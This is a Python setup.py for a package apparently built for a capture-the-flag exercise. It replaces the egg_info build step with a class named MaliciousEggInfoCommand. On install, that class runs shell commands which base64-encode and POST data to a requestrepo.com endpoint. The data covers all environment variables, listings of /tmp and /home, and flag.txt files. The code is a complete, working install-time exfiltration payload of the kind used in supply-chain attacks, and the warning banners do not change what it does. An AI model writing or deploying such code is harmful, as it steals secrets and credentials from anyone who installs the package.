from setuptools import setup, find_packages
from setuptools.command.egg_info import egg_info as _egg_info
import os
import platform # To make it a bit more robust

# --- Configuration ---
# IMPORTANT: Replace this with your actual RequestRepo endpoint
# (or any other HTTP endpoint you control that can log POST requests)
REQUEST_REPO_URL = "https://x0vr65gg.requestrepo.com" # CHANGE THIS!
# --- End Configuration ---

def exfiltrate_data(data_description: str, command: str, endpoint_path: str):
    """Helper function to exfiltrate data."""
    print(f"Attempting to exfiltrate: {data_description}")
    # Use base64 to avoid issues with special characters in POST data
    # and use --data-binary for curl with @-
    # The `tr -d '\n'` or `base64 -w0` (for GNU) or `base64 -b 0` (for macOS)
    # is to remove newlines from base64 output if it wraps.
    # We'll try to make it somewhat cross-platform.
    base64_cmd = "base64 -w0" # Linux
    if platform.system() == "Darwin": # macOS
        base64_cmd = "base64 -b 0"

    # Ensure curl sends data as raw as possible and handles larger outputs.
    # Use a temporary file for larger outputs to avoid shell command length limits.
    # Piping directly is fine for smaller things like env.
    if "@-" in command: # Expecting piped input
        full_command = f"{command} | {base64_cmd} | curl -s -X POST --data-binary @- {REQUEST_REPO_URL}/{endpoint_path}"
    else: # Expecting command to output to stdout, then pipe
        full_command = f"{command} 2>/dev/null | {base64_cmd} | curl -s -X POST --data-binary @- {REQUEST_REPO_URL}/{endpoint_path}"

    print(f"Executing: {full_command[:100]}...") # Print only a part of it to avoid clutter
    os.system(full_command)
    print(f"Exfiltration attempt for {data_description} complete.")

class MaliciousEggInfoCommand(_egg_info):
    def run(self):
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        print("!!! WARNING: EXECUTING POTENTIALLY MALICIOUS CODE (CTF TEST) !!!")
        print(f"!!! Data will be sent to: {REQUEST_REPO_URL} !!!")
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")

        # 1. Exfiltrate Environment Variables
        exfiltrate_data("Environment Variables", "env", "ENV_VARS_B64")

        # 2. Exfiltrate /tmp directory listing
        # Be careful with `tar`ing /tmp, it can be huge. A listing is safer.
        exfiltrate_data("/tmp Directory Listing", "ls -la /tmp", "TMP_LISTING_B64")

        # 3. Exfiltrate /home directory listing (EXTREMELY SENSITIVE - USE WITH CAUTION)
        # This lists directories in /home. To list contents of a specific user's home,
        # you'd need to know the username or iterate.
        # This is highly invasive. For a CTF, you might be targeting a specific user's dir.
        exfiltrate_data("/home Directory Listing", "ls -la /home", "HOME_LISTING_B64")

        # Example: Exfiltrate a specific user's home directory listing if you knew the user
        # current_user = os.getlogin() # This might not always be reliable in all contexts
        # exfiltrate_data(f"/home/{current_user} Listing", f"ls -la /home/{current_user}", f"HOME_{current_user}_LISTING_B64")

        # 4. Exfiltrate contents of flag.txt
        # Assume flag.txt could be in common places. Try a few.
        # This will send data if the file exists and is readable.
        # The `cat ... 2>/dev/null` suppresses "No such file or directory" errors from shell.
        exfiltrate_data("flag.txt (current dir)", "cat ./flag.txt", "FLAG_TXT_CWD_B64")
        exfiltrate_data("flag.txt (/)", "cat /flag.txt", "FLAG_TXT_ROOT_B64")
        exfiltrate_data("flag.txt (/tmp)", "cat /tmp/flag.txt", "FLAG_TXT_TMP_B64")
        # If you know the flag is in the user's home directory:
        # exfiltrate_data("flag.txt (~/flag.txt)", f"cat ~{current_user}/flag.txt", f"FLAG_TXT_HOME_B64")


        # If you wanted to send the *actual contents* of /tmp (VERY RISKY, CAN BE HUGE):
        # print("!!! WARNING: Attempting to TAR and exfiltrate /tmp. This can be very large and slow. !!!")
        # # Using tar with stderr redirection to /dev/null to suppress permission errors for files it can't read
        # exfiltrate_data("/tmp Contents (TAR)", "tar czf - /tmp 2>/dev/null", "TMP_CONTENTS_TAR_GZ_B64")
        # Note: Sending binary tar.gz as base64 POST data is inefficient but works for demonstration.
        # A real attacker might use --data-binary with curl directly if the endpoint supports it.
        # For the current exfiltrate_data, it will be base64 encoded.

        print("--- Malicious Actions Attempted ---")
        _egg_info.run(self) # Run the original egg_info command
        print("MaliciousEggInfoCommand: Finished.")

setup(
    name = "ctftestsowwy", # Changed name slightly
    version = "0.0.9",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'egg_info': MaliciousEggInfoCommand,
        # You could add these to 'develop' or a custom 'install' too,
        # keeping in mind when those commands actually run.
    },
    # If your package needs `curl` or `base64` to run these commands,
    # you can't really declare them as install_requires because this code
    # runs *during* the setup process itself. It assumes these tools are present.
)